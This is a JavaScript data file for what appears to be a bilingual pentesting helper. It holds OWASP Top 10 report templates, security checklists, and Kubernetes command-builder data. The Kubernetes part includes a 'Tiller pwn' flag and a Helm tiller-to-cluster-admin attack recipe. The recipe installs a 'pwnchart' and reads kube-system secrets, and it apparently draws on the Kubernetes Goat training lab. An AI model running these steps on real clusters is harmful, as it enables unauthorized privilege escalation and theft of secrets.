/* Reporting, checklists, command builders, and Kubernetes workflows. */
(() => {
  const M = (ru, en) => ({ ru, en });
...
const REPORT_TEMPLATES = {
  A01: {
    ...
    body: { ru: `## Сводка
Контроль доступа не работает на сервере: пользователи могут получать доступ к объектам или функциям за пределами своей авторизации (IDOR/BOLA, горизонтальное/вертикальное повышение привилегий, force browsing).
...
`, en: `## Summary
Access control fails on the server: users can access objects or functions outside their authorization (IDOR/BOLA, horizontal/vertical privilege escalation, force browsing).
...
` },
  ...
  A02: {
    ...
    body: { ru: `## Сводка
Конфиденциальные данные раскрываются из-за слабой или отсутствующей криптографии: передача/хранение в открытом виде, сломанное хеширование паролей, жёстко заданные ключи или ошибки верификации JWT (alg:none, слабый HMAC).
...
` },
  ...
  A03: {
    ...
    body: { ru: `## Сводка
Непроверенный ввод интерпретируется как код или язык запросов (SQL, HTML/JS, OS-команда, шаблон), что позволяет изменять логику или выполнять код.
...
` },
  ...
  A04: {
    ...
    body: { ru: `## Сводка
В дизайне отсутствуют средства безопасности: нет ограничения скорости для OTP, доверие ценам на клиенте, состояния гонки, обход многошаговых потоков.
...
`, en: `## Summary
Security controls are missing from the design: no rate limit on OTP, client-trusted prices, race conditions, multi-step flow bypass.
...
` },
  ...
  A05: {
    ...
    body: { ru: `## Сводка
Небезопасные настройки по умолчанию или открытые поверхности: отладка/трассировка стека, открытый admin, неаутентифицированный Swagger, учётные данные по умолчанию, отсутствующие заголовки, разрешающий CORS.
...
`, en: `## Summary
Insecure defaults or exposed surfaces: debug/stack traces, open admin, unauthenticated Swagger, default credentials, missing headers, permissive CORS.
...
` },
  ...
  A07: {
    ...
    body: { ru: `## Сводка
Аутентификация или обработка сессий позволяет выдавать себя за другого: слабые пароли, отсутствие MFA, фиксация сессии, предсказуемые токены, перебор без контроля, сломанный logout.
...
`, en: `## Summary
Authentication or session handling allows impersonation: weak passwords, no MFA, session fixation, predictable tokens, stuffing without controls, broken logout.
...
` },
  ...
  A08: {
    ...
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    body: { ru: `## Сводка
Целостность кода или данных не проверяется: небезопасная десериализация, неподписанные обновления/артефакты CI, отсутствие SRI, подделанные сериализованные куки.
...
` },
  ...
  A09: {
    ...
    body: { ru: `## Сводка
События, важные для безопасности, не логируются, не мониторятся, или логи могут быть подделаны, поэтому атаки остаются незамеченными.
...
`, en: `## Summary
Security-relevant events are not logged, not monitored, or logs can be forged, so attacks go undetected.
...
` },
  ...
  A10: {
    ...
    body: { ru: `## Сводка
Ошибки и граничные случаи обрабатываются неправильно (fail-open в безопасности, подробные исключения, истощение ресурсов) и/или SSRF позволяет серверу выполнять запросы к контролируемым атакующим URL (внутренние/metadata).
...
`, en: `## Summary
Errors and edge cases are mishandled (fail-open security, verbose exceptions, resource exhaustion) and/or SSRF lets the server fetch attacker-controlled URLs (internal/metadata).
...
const CHECKLISTS = [
  { code:'A01', title: M('Broken Access Control', 'Broken Access Control'), items: [
    M('Ownership: object ID не отдаёт чужие orders/users/files (нет IDOR)', 'Ownership: object IDs cannot expose others’ orders/users/files (no IDOR)'),
    M('Горизонтальный доступ: user A не читает данные user B', 'Horizontal access: user A cannot read user B’s data'),
    M('Вертикальный: обычный user не вызывает admin API', 'Vertical: regular user cannot call admin API'),
    M('Method override (POST/DELETE) не обходит authz', 'Method override (POST/DELETE) does not bypass authz'),
    M('Force browsing /admin /internal блокируется', 'Force browsing /admin /internal is blocked'),
    M('Роли/JWT claims проверяются на сервере, не доверяются слепо', 'Roles/JWT claims verified server-side, not trusted blindly'),
  ]},
  { code:'A02', title: M('Cryptographic Failures', 'Cryptographic Failures'), items: [
    M('JWT HS256: сильный секрет, нет alg:none / algorithm confusion', 'JWT HS256: strong secret; no alg:none / algorithm confusion'),
    M('Пароли: современный KDF (bcrypt/argon2), не MD5/SHA1 без salt', 'Passwords: modern KDF (bcrypt/argon2), not MD5/SHA1 without salt'),
    M('TLS везде; нет mixed content; HSTS включён где нужно', 'TLS everywhere; no mixed content; HSTS where appropriate'),
    M('Секреты не в URL, логах, клиенте, git-репозитории', 'Secrets not in URLs, logs, client code, or git repos'),
    M('Чувствительные данные не в plaintext cookie/localStorage без нужды', 'Sensitive data not in plaintext cookies/localStorage without need'),
  ]},
  { code:'A03', title: M('Injection', 'Injection'), items: [
    M('SQL: параметризованные запросы / ORM, нет конкатенации', 'SQL: parameterized queries / ORM, no string concat'),
    M('XSS: output encoding / CSP; reflected, stored, DOM закрыты', 'XSS: output encoding / CSP; reflected, stored, DOM covered'),
    M('OS command: нет shell concat; diag/ping безопасны', 'OS command: no shell concat; diag/ping hardened'),
    M('NoSQL: operators $ne/$gt не проходят из user input', 'NoSQL: $ne/$gt operators not accepted from user input'),
    M('SSTI: шаблоны не рендерят сырой user input ({{7*7}})', 'SSTI: templates do not render raw user input ({{7*7}})'),
  ]},
  { code:'A04', title: M('Insecure Design', 'Insecure Design'), items: [
    M('OTP/SMS: rate limit и backoff на перебор', 'OTP/SMS: rate limit and backoff against brute force'),
    M('Бизнес-логика: negative qty/price и скип шагов отклоняются', 'Business logic: negative qty/price and step-skips rejected'),
    M('Multi-step flow: нельзя перепрыгнуть обязательные шаги', 'Multi-step flow: required steps cannot be skipped'),
    M('Anti-automation: captcha/backoff на чувствительных действиях', 'Anti-automation: captcha/backoff on sensitive actions'),
    M('Threat model / abuse cases учтены до реализации фичи', 'Threat model / abuse cases considered before shipping the feature'),
  ]},
  { code:'A05', title: M('Security Misconfiguration', 'Security Misconfiguration'), items: [
    M('Prod: DEBUG выключен, stack traces не уходят клиенту', 'Prod: DEBUG off; stack traces not sent to clients'),
    M('Нет default credentials; секреты сменены с defaults', 'No default credentials; defaults rotated'),
    M('Directory listing и backup-файлы закрыты', 'Directory listing and backup files disabled'),
    M('Security headers: CSP, X-Frame-Options / frame-ancestors…', 'Security headers: CSP, X-Frame-Options / frame-ancestors…'),
    M('CORS: нет «*» вместе с credentials', 'CORS: no «*» together with credentials'),
  ]},
  { code:'A06', title: M('Vulnerable Components', 'Vulnerable Components'), items: [
    M('Зависимости актуальны; есть SBOM / inventory', 'Dependencies current; SBOM / inventory exists'),
    M('Known CVE в стеке закрыты или есть план mitigation', 'Known CVEs in the stack fixed or mitigated'),
    M('Deser / Log4j-class sinks не принимают untrusted input', 'Deser / Log4j-class sinks reject untrusted input'),
    M('Зависимости pinned (lockfile); CI ловит advisories', 'Dependencies pinned (lockfile); CI catches advisories'),
    M('Убраны неиспользуемые libs и debug endpoints', 'Unused libs and debug endpoints removed'),
  ]},
  { code:'A07', title: M('Identification & Auth Failures', 'Identification & Auth Failures'), items: [
    M('Login: lockout / rate limit против brute-force', 'Login: lockout / rate limit against brute-force'),
    M('Session ID криптостойкий; regenerate после login', 'Session ID cryptographically strong; regenerate on login'),
    M('Нет session fixation; cookie flags Secure/HttpOnly/SameSite', 'No session fixation; cookie flags Secure/HttpOnly/SameSite'),
    M('Password reset: одноразовый токен, короткий TTL, не soft leak', 'Password reset: one-time token, short TTL, no soft leak'),
    M('MFA на чувствительных действиях (где требуется)', 'MFA on sensitive actions (where required)'),
  ]},
  { code:'A08', title: M('Software & Data Integrity', 'Software & Data Integrity'), items: [
    M('Updates / webhooks: подпись и проверка источника', 'Updates / webhooks: signature and source verification'),
    M('Deserialization: только trusted data / safe formats', 'Deserialization: trusted data / safe formats only'),
    M('CI/CD: секреты не в логах и не в публичных артефактах', 'CI/CD: secrets not in logs or public artifacts'),
    M('Целостность cookies/tokens: подпись, anti-tamper', 'Cookie/token integrity: signed, anti-tamper'),
    M('Supply chain: verify packages / checksums where critical', 'Supply chain: verify packages / checksums where critical'),
  ]},
  { code:'A09', title: M('Logging & Monitoring', 'Logging & Monitoring'), items: [
    M('Failed logins и auth events пишутся в лог', 'Failed logins and auth events are logged'),
    M('Admin / sensitive actions — audit trail', 'Admin / sensitive actions have an audit trail'),
    M('Алерты на burst auth failures / аномалии', 'Alerts on auth failure bursts / anomalies'),
    M('Секреты и PII не попадают в логи', 'Secrets and PII do not land in logs'),
    M('Логи централизованы и доступны для расследования', 'Logs centralized and usable for investigation'),
  ]},
  { code:'A10', title: M('SSRF / Exceptional Conditions', 'SSRF / Exceptional Conditions'), items: [
    M('User-controlled URL: allowlist; нет доступа к internal hosts', 'User-controlled URL: allowlist; no reach to internal hosts'),
    M('IMDS / cloud metadata недоступны из app-fetch', 'IMDS / cloud metadata unreachable from app fetch'),
    M('Ошибки auth: fail-closed, не fail-open', 'Auth errors: fail-closed, not fail-open'),
    M('500/errors не утекают internals (stack, paths, secrets)', '500/errors do not leak internals (stack, paths, secrets)'),
    M('Timeouts и default-deny на сетевых исходящих вызовах', 'Timeouts and default-deny on outbound network calls'),
  ]},
];
...
const KUBER_DATA = {
  tools: [
    ...
    },
    {
      ...
      name: 'helm',
      base: 'helm',
      desc: M('Пакетный менеджер Helm. v2 tiller → часто cluster-admin.', 'Package manager. v2 tiller → cluster-admin.'),
      targetPlaceholder: 'CMD',
      flags: [
        { id:'list', flag:'list', help: M('Релизы', 'Releases'), def:true },
        { id:'install', flag:'install R CHART', help: M('Install chart', 'Install chart') },
        { id:'unin', flag:'uninstall R', help: M('Delete', 'Delete') },
        { id:'tver', flag:'--host tiller-deploy.kube-system:44134 version', help: M('Tiller version', 'Tiller version') },
        { id:'tinst', flag:'--host tiller-deploy.kube-system:44134 install --name pwnchart /pwnchart', help: M('Tiller pwn', 'Tiller pwn') },
  ...
  attacks: [
    ...
    {
      id: 'k8s-helm-tiller',
      title: M('Helm tiller → cluster-admin', 'Helm tiller → cluster-admin'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Подключиться к tiller', 'Connect to tiller'), c: 'kubectl run -it --rm --image=madhuakula/k8s-goat-helm-tiller -- bash' },
        { t: M('Проверить версию', 'Check version'), c: 'helm --host tiller-deploy.kube-system:44134 version' },
        { t: M('Установить pwnchart', 'Install pwnchart'), c: 'helm --host tiller-deploy.kube-system:44134 install --name pwnchart /pwnchart' },
        { t: M('Cluster-admin доступ', 'Cluster-admin access'), c: 'kubectl get secrets -n kube-system' },
      ],
    },
    {
      id: 'k8s-ns-bypass',
  ...
  Object.assign(DATA, { REPORT_TEMPLATES, CHECKLISTS, CMD_BUILDERS, KUBER_DATA });
})();
